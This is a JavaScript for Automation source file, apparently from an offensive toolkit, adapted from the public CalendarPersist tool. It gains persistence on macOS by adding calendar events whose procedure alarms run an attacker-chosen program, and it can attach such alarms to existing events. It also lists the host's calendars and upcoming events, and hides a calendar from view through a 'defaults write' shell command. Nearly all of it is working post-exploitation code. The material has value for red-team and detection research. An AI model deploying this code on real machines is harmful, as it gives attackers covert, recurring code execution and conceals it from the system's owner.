// Adaptation of CalendarPersist from rookuu
// https://github.com/FSecureLABS/CalendarPersist
ObjC.import('EventKit')

function persist_calalert(title, target, delay, frequency, interval, end, uid) {
    store = $.EKEventStore.alloc.initWithAccessToEntityTypes($.EKEntityMaskEvent)
    event = $.EKEvent.eventWithEventStore(store)

    event.availability = $.EKEventAvailabilityFree
    event.startDate = $.NSDate.alloc.initWithTimeIntervalSinceNow(delay)
    event.endDate = $.NSDate.alloc.initWithTimeIntervalSinceNow(delay + 60)
    event.title = title
    event.calendar = store.calendarWithIdentifier(uid)

    path = target

    target = $.NSURL.alloc.initWithString("file:///" + target)

    error = $.NSError
    bookmark = target.bookmarkDataWithOptionsIncludingResourceValuesForKeysRelativeToURLError(
        $.NSURLBookmarkCreationMinimalBookmark,
        [],
        $.NSURL.alloc.initWithString("file:////"),
        error
    )

    if (error.description != undefined) {
        return error.description.js
    }

    alarm = $.EKAlarm.procedureAlarmWithBookmark(bookmark)
    event.addAlarm(alarm)

    recurFreqMap = {
        "daily": $.EKRecurrenceFrequencyDaily,
        "weekly": $.EKRecurrenceFrequencyWeekly,
        "monthly": $.EKRecurrenceFrequencyMonthly,
        "yearly": $.EKrecurrenceFrequencyYearly
    }

    recur = $.EKRecurrenceRule.alloc.initRecurrenceWithFrequencyIntervalEnd(
        recurFreqMap[frequency],
        interval,
        $.EKRecurrenceEnd.recurrenceEndWithOccurrenceCount(end)
    )
    event.addRecurrenceRule(recur)

    error = $.NSError
    store.saveEventSpanError(event, $.EKSpanThisEvent, error)

    if (error.description != undefined) {
        return error.description.js
    }

    var output = ""
    output += "Calendar Event Created: \n\tTitle: " + ObjC.unwrap(event.title) +
        "\n\tCalendar: " + ObjC.unwrap(event.calendar.title) + "(" +
        ObjC.unwrap(event.calendar.type) + ")" + " " + ObjC.unwrap(event.calendar.calendarIdentifier) +
        "\n\tStart Date: " + ObjC.unwrap(event.startDate) +
        "\n\tFrequency: " + frequency +
        "\n\tInterval: " + interval +
        "\n\tNumber of Events: " + end +
        "\n\tApplication to be Executed: " + path
    return output
}

function list_calendars() {
    store = $.EKEventStore.alloc.initWithAccessToEntityTypes($.EKEntityMaskEvent)
    eventCalendars = store.calendarsForEntityType($.EKEntityTypeEvent)

    var output = ""

    output += "Calendars on the host: " + "\n"
    for (var i = 0; i < eventCalendars.count; i++) {
        var calendar = eventCalendars.objectAtIndex(i)
        output += ObjC.unwrap(calendar.title) + "(" + ObjC.unwrap(calendar.type) + "): " + ObjC.unwrap(calendar.calendarIdentifier)
        output += "\n"
    }

    return output
}

function hide_calendar(uid) {
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;
    app.doShellScript("defaults write com.apple.iCal DisabledCalendars -dict MainWindow '(" + uid + ")'");
    var output = ""

    output += "Hidden Calendar "

    store = $.EKEventStore.alloc.initWithAccessToEntityTypes($.EKEntityMaskEvent)
    eventCalendars = store.calendarsForEntityType($.EKEntityTypeEvent)

    for (var i = 0; i < eventCalendars.count; i++) {
        var calendar = eventCalendars.objectAtIndex(i)
        if (ObjC.unwrap(calendar.calendarIdentifier) == uid) {
            output += ObjC.unwrap(calendar.title) + "(" + ObjC.unwrap(calendar.type) + "): " + ObjC.unwrap(calendar.calendarIdentifier)
        }
    }
    output += " . May require Calendar restart to remove from view."


    return output
}

function list_calendar_events(hoursInFuture) {
    store = $.EKEventStore.alloc.initWithAccessToEntityTypes($.EKEntityMaskEvent)
    predicateStart = $.NSDate.alloc.initWithTimeIntervalSinceNow(1)
    predicateEnd = $.NSDate.alloc.initWithTimeIntervalSinceNow(60 * 60 * hoursInFuture)
    predicate = store.predicateForEventsWithStartDateEndDateCalendars(predicateStart, predicateEnd, [])

    events = store.eventsMatchingPredicate(predicate)

    var output = ""
    output += "All events in the next " + hoursInFuture + " hours: " + "\n"

    for (var i = 0; i < events.count; i++) {
        var event = events.objectAtIndex(i)
        output += ObjC.unwrap(event.title) + ", " + ObjC.unwrap(event.startDate) + ", " + ObjC.unwrap(event.eventIdentifier) + "\n"
    }

    return output
}

function persist_calalert_existing(uid, target) {
    store = $.EKEventStore.alloc.initWithAccessToEntityTypes($.EKEntityMaskEvent)
    event = store.eventWithIdentifier(uid)
    target = $.NSURL.alloc.initWithString("file:///" + target)

    error = $.NSError
    bookmark = target.bookmarkDataWithOptionsIncludingResourceValuesForKeysRelativeToURLError(
        $.NSURLBookmarkCreationMinimalBookmark,
        [],
        $.NSURL.alloc.initWithString("file:////"),
        error
    )

    if (error.description != undefined) {
        return error.description.js
    }

    alarm = $.EKAlarm.procedureAlarmWithBookmark(bookmark)
    event.addAlarm(alarm)

    error = $.NSError
    store.saveEventSpanError(event, $.EKSpanThisEvent, error)

    if (error.description != undefined) {
        return error.description.js
    }

    var output = ""
    output += "Created Persistence alarm to existing Event '" + ObjC.unwrap(event.title) + "'"

    return output
}
